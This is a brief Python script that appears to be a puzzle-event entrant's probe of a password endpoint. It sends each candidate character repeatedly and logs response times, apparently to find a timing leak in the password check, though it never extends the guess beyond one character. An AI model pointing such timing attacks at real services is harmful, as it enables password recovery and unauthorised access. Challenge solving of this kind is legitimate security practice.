from typing import List
import requests
import time
import string


FOOLS_URL = "http://fools2024.online:26273"
ALPHABET = string.printable
UA = "fools/0.0 (Discord @muzuwi ; ping if i'm being annoying)"
TIMEOUT = 1.0 # seconds
REPEATS = 5


def make_request(pswd: str) -> requests.Response:
    resp = requests.get(f"{FOOLS_URL}/secret", params={
        "p": pswd
    }, headers={
        "User-Agent": UA,
    })
    return resp


def main():
    current = ""
    for ch in ALPHABET:
        completed = current + ch

        print(f"Trying '{completed}'..")
        res: List[requests.Response] = []
        for _ in range(0, REPEATS):
             res.append(make_request(completed))
             time.sleep(TIMEOUT)

        for r in res:
            print(f"\tTook: ", r.elapsed.total_seconds())
            print(r.content)



if __name__ == "__main__":
    main()
